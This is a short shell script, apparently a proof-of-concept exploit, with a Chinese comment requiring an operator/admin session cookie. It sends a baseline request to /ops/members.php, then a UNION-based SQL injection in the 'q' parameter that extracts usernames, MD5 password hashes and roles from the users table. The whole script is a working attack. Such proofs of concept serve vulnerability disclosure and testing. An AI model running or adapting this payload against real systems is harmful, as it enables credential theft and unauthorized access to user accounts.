#!/bin/sh
# 需先以 operator/admin 登录并取得 SHOPSESSID
BASE=${BASE:-http://target}
C=${COOKIE:?set COOKIE to 'SHOPSESSID=...'}
echo '--- baseline ---'
curl -s -H "Cookie: $C" -H 'Accept: application/json' "$BASE/ops/members.php?q=alice"
echo
echo '--- union leak users.password_md5 ---'
curl -s -G -H "Cookie: $C" -H 'Accept: application/json' --data-urlencode "q=x%' UNION SELECT id,username,password_md5,role FROM users-- -" "$BASE/ops/members.php"

